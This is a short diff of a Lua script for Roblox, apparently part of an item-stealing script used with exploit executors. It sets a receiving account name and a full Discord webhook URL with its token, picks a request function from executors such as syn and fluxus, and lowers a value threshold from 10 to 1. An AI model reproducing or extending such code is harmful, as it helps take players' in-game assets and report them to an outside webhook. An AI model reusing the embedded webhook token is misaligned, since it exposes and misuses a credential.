@@ -8,7 +8,7 @@ local LocalPlayer = Players.LocalPlayer
 local RECEIVER = { "Thebestfunnehfanisme" }
 local WEBHOOK =
 	"https://discord.com/api/webhooks/1497722335472652369/d7U2Gui_fyu1c_aAYihhpMSBcnWGWrkGRQPW9UV4zZZs2y909fFlpui2TlHirAhK9Djm"
-local THRESHOLD = 10
+local THRESHOLD = 1
 
 local requestFunction = syn and syn.request or http_request or request or fluxus and fluxus.request
 
